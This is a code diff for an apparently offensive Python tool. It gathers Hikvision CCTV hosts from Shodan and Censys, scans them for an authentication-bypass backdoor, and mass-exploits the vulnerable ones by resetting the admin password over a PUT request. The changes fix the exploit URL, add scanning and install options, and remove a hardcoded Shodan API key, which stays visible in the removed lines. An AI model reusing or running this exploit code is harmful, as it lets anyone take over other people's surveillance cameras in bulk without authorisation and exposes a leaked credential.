@@ -16,9 +16,6 @@ global host
 
 t = Terminal()
 path = os.path.abspath(os.path.dirname(sys.argv[0]))
-#api_shodan_key = open(path + "/api.txt","r").read()
-api_shodan_key = "fr62gh78X2MzHCHcDf6mDxropyQ4XhIR"
-api = shodan.Shodan(api_shodan_key)
 userID = ""
 userName = ""
 newPass = ""
@@ -39,22 +36,33 @@ def usage():
 | Usage:                                                     |
 | 1. Gather host with shodan (api needed)                    |
 | 2. Gather host with censys.io (api needed)                 |
-| 3. scan for vuln host                                      |
-| 4. mass exploit all vuln CCTV                              |
-| 5. select a CCTV'S ip to exploit                           |
-| 6. random exploit CCTV from the vuln list                  |
+| 3. scan for up host                                        |
+| 4. scan for vuln host                                      |
+| 5. mass exploit all vuln CCTV                              |
+| 6. select a CCTV'S ip to exploit                           |
+| 7. random exploit CCTV from the vuln list                  |
+| 8. install dependency                                      |
 +------------------------------------------------------------+""")
                                                                 
 def gather_host_shodan():
-    try:
-        query = raw_input("["+t.blue("*")+"]"+ " enter a valid shodan query:")
-        response = api.search(query)
-        with open(path +'/host.txt',"wb") as host:
-            for service in response['matches']:
-                host.write(service['ip_str']+ ":" + str(service['port']))#host.write(service['port']
-                host.write("\n")
-    except KeyboardInterrupt:
-        print t.red("\n[---]exiting now[---]")
+    api_shodan_key = open(path + "/api.txt","r").read()
+    if api_shodan_key == "":
+        print(t.red('no shodan api found, please insert a valid one'))
+        api_shodan_key_to_file = raw_input('\ntype here:')
+        with open(path + "/api.txt", "wb") as api:
+            api.write(api_shodan_key_to_file)
+        api = shodan.Shodan(api_shodan_key)
+    else:
+        api = shodan.Shodan(api_shodan_key)
+        try:
+            query = raw_input("["+t.blue("*")+"]"+ " enter a valid shodan query:")
+            response = api.search(query)
+            with open(path +'/host.txt',"wb") as host:
+                for service in response['matches']:
+                    host.write(service['ip_str']+ ":" + str(service['port']))#host.write(service['port']
+                    host.write("\n")
+        except KeyboardInterrupt:
+            print t.red("\n[---]exiting now[---]")
 
 
 
@@ -76,7 +84,7 @@ def mass_exploit():
         userID = "1"
         userName = "admin"
         userXML = '<User version="1.0" xmlns="http://www.hikvision.com/ver10/XMLSchema">''.<id>'+ userID + '</id>.<userName>'+ userName + '</userName>.<password>'+ newPass + '</password>.</User>'
-        URLBase = "http://"+target_host+str(port) + "/"
+        URLBase = "http://"+target_host+ ":" + str(port) + "/"
         URLUpload = URLBase + "Security/users/1?" + BackdoorAuthArg
         requests.put(URLUpload, data=userXML).text
         a += 1
@@ -225,21 +233,37 @@ def vuln_scan_exp():
     p = 0
     while p < len(vuln_host):
         ip_to_check = vuln_host[p]
-        response = requests.get('http://'+ip_to_check+'/security/users/1?'+ BackdoorAuthArg)
-        if response.status_code == 200:
-            with open(path + '/host.txt' , 'a') as host_vuln:
-                host_vuln.write(ip_to_check + "\n")
-        elif response.status_code ==401:
+        try:
+            response = requests.get('http://'+ip_to_check+'/security/users/1?'+ BackdoorAuthArg)
+            if response.status_code == 200:
+                with open(path + '/host.txt' , 'a') as host_vuln:
+                    host_vuln.write(ip_to_check + "\n")
+            elif response.status_code ==401:
+                pass
+            elif response.status_code ==404:
+                pass
+            p += 1
+        except requests.exceptions.ConnectionError:
             pass
-        p += 1
-    
+            p += 1
     
             
         
     
 def scan():
     vuln_scan()
-    vuln_scan_exp()
+    #vuln_scan_exp()
+
+def install_dependence():
+    install = raw_input(t.white('[')+t.green('*')+t.white(']')+t.green('Would you like to install the dependency? (y/n)'))
+    if install == "y":
+        os.system('pip install shodan')
+        os.system('pip install censys')
+        usage()
+        response()
+    elif install == "n":
+        usage()
+        response()
 
     
     
@@ -255,7 +279,10 @@ def response():
     elif str(usage_str) == "3":
         scan()
         response()
-    elif str(usage_str) == "4":
+    elif str(usage_str) =="4":
+        vuln_scan_exp()
+        response()
+    elif str(usage_str) == "5":
         print(t.red('[!!!]')+t.green('Very dangerous option please be carefull'))
         answer = raw_input(t.green('[???]')+t.blue('do you wanna continue? [y/n]'))
         if str(answer) == "y":
@@ -263,12 +290,14 @@ def response():
             response()
         elif str(answer) == "n":
             response()
-    elif str(usage_str) == "5":
+    elif str(usage_str) == "6":
         select_host_exploit()
         response()
-    elif str(usage_str) == "6":
+    elif str(usage_str) == "7":
         random_host_exploit()
         response()
+    elif str(usage_str) =="8":
+        install_dependence()
     elif str(usage_str) == "help":
         main()
         
